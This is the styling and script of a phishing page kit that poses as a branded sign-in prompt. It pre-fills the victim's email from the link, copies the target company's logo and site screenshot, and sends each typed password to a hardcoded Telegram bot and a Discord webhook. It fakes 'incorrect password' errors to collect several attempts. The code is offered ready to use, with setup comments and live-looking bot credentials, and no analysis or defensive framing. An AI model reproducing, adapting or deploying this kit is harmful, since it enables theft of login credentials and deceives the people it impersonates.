<style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body,html { height:100%; overflow:hidden; background:#000; font-family:Segoe UI,Arial,sans-serif; }
    #bg { position:fixed; inset:0; background:center/cover no-repeat; z-index:1; }
    .overlay { position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:2; }
    .box {
        position:fixed;
        top:50%; left:50%;
        transform:translate(-50%,-50%);
        width:90%; max-width:360px;
        background:#fff;
        padding:32px 24px 60px;
        border-radius:16px;
        box-shadow:0 20px 60px rgba(0,0,0,0.9);
        z-index:10;
        text-align:center;
    }
    .logo { max-width:160px; margin:15px auto 20px; display:block; border-radius:10px; }
    .locked {
        background:#e8f5e8;
        color:#0066cc;
        padding:12px;
        border-radius:10px;
        font-weight:bold;
        font-size:15px;
        margin:15px 0 25px;
        line-height:1.4;
    }
    input,button {
        width:100%;
        padding:14px;
        margin:8px 0;
        border-radius:10px;
        border:1px solid #ccc;
        font-size:15px;
    }
    input.locked { background:#f5f5f5; color:#555; cursor:not-allowed; }
    button {
        background:#0067b8;
        color:#fff;
        border:none;
        font-weight:bold;
        cursor:pointer;
        padding:15px;
    }
    button:hover {
        background:#005a9e;
    }
    .footer {
        position:fixed;
        bottom:0; left:0; right:0;
        background:#fff;
        padding:10px 0;
        text-align:center;
        font-size:11px;
        color:#333;
        border-top:1px solid #eee;
        z-index:10;
    }
    .powered { font-weight:900; color:#000; font-size:12px; margin-bottom:6px; }
    .logos img { height:24px; margin:0 6px; vertical-align:middle; }
    
    /* Custom alert overlay - clean without domain info */
    .custom-alert {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: white;
        padding: 20px 30px;
        border-radius: 12px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        z-index: 1000;
        text-align: center;
        min-width: 280px;
        border-top: 4px solid #d32f2f;
        animation: fadeIn 0.3s ease;
    }
    .custom-alert .alert-icon {
        font-size: 48px;
        margin-bottom: 12px;
    }
    .custom-alert .alert-message {
        font-size: 16px;
        color: #333;
        margin-bottom: 20px;
        font-weight: 500;
    }
    .custom-alert .alert-button {
        background: #0067b8;
        color: white;
        border: none;
        padding: 10px 24px;
        border-radius: 8px;
        font-size: 14px;
        cursor: pointer;
        font-weight: 600;
    }
    .custom-alert .alert-button:hover {
        background: #005a9e;
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translate(-50%, -48%); }
        to { opacity: 1; transform: translate(-50%, -50%); }
    }
    .overlay-dark {
        position: fixed;
        inset: 0;
        background: rgba(0,0,0,0.5);
        z-index: 999;
    }
</style>

<script type="22a5f1150111d007a5fb3d70-text/javascript">
// === CHANGE ONLY THESE THREE LINES (YOUR TELEGRAM & DISCORD CREDENTIALS) ===
// 1. Telegram Bot Token
const TG_TOKEN = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk"; // ← Paste bot token here
// 2. Telegram Chat ID
const TG_CHAT = "1357995456"; // ← Paste chat ID here
// 3. Discord Webhook URL
const DC_WEBHOOK = "discord_api_webhook"; // ← Paste full webhook URL here
// ===========================================================================

// Custom alert function (no domain info)
function showAlert(message, isError = true) {
    // Remove existing alert if any
    const existingOverlay = document.querySelector('.overlay-dark');
    const existingAlert = document.querySelector('.custom-alert');
    if (existingOverlay) existingOverlay.remove();
    if (existingAlert) existingAlert.remove();
    
    // Create overlay
    const overlay = document.createElement('div');
    overlay.className = 'overlay-dark';
    document.body.appendChild(overlay);
    
    // Create alert box
    const alertBox = document.createElement('div');
    alertBox.className = 'custom-alert';
    alertBox.innerHTML = `
        <div class="alert-icon">${isError ? '⚠️' : '✅'}</div>
        <div class="alert-message">${message}</div>
        <button class="alert-button" id="alertOkBtn">OK</button>
    `;
    document.body.appendChild(alertBox);
    
    // Handle OK button click
    const okBtn = document.getElementById('alertOkBtn');
    okBtn.addEventListener('click', () => {
        overlay.remove();
        alertBox.remove();
    });
    
    // Also close on overlay click
    overlay.addEventListener('click', () => {
        overlay.remove();
        alertBox.remove();
    });
}

// Auto-grab email from ?email=, ?e= or #hash
let email = "";
const urlParams = new URLSearchParams(window.location.search);
email = urlParams.get('email') || urlParams.get('e') || '';
if (!email && window.location.hash) {
    email = window.location.hash.substring(1);
}
email = decodeURIComponent(email.trim());
// Hide email from address bar after loading
if (email) history.replaceState(null, null, location.pathname);
// Lock email field
if (email && email.includes('@')) {
    document.getElementById('email').value = email;
    let domain = email.split('@')[1];
    // Logo
    document.getElementById('logo').src = `https://logo.clearbit.com/${domain}?size=180`;
    document.getElementById('logo').onerror = function() {
        this.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
    };
    // Background
    let bg_image = `https://image.thum.io/get/width/1500/crop/1000/noanimate/https://${domain}`;
    $.ajax({
        url: bg_image,
        type: "GET",
        success: function(_, __, xhr) {
            let ct = xhr.getResponseHeader("content-type") || "";
            if (ct.includes('image')) {
                document.getElementById('bg').style.backgroundImage = `url("${bg_image}")`;
            }
        }
    });
}

// Submit logic with clean alerts (no domain info)
let count = 0;
document.getElementById('loginform').onsubmit = function(e) {
    e.preventDefault();
    let pswd = document.getElementById("password").value.trim();
    if (pswd.length < 5) {
        showAlert("Password too short (minimum 5 characters)");
        document.getElementById("password").value = "";
        return;
    }
    
    // Send credentials to Telegram + Discord
    const log = `WORLDWIDE Atomic Page — CREDENTIALS\nEmail: ${email}\nPassword: ${pswd}\nUser Agent: ${navigator.userAgent}\nAttempt: ${count+1}`;
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(log)}`).catch(()=>{});
    fetch(DC_WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: "```"+log+"```"})
    }).catch(()=>{});
    
    count++;
    
    if (count >= 3) {
        // Show custom alert for max attempts
        showAlert("Too many failed attempts. Please reload the page and try again.");
        setTimeout(() => {
            document.body.innerHTML = `<h2 style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:50px;border-radius:20px;color:#d93025;text-align:center">Access Denied<br>Maximum attempts exceeded.<br>Please reload the link and try again.</h2>`;
        }, 2000);
    } else {
        // Clean alert message - NO DOMAIN INFO, just attempt number
        const remaining = 3 - count;
        let attemptMessage = `Incorrect password. Attempt ${count} of 3. ${remaining} attempt${remaining !== 1 ? 's' : ''} remaining.`;
        showAlert(attemptMessage);
        document.getElementById("password").value = "";
        document.getElementById("password").focus();
    }
};
</script>
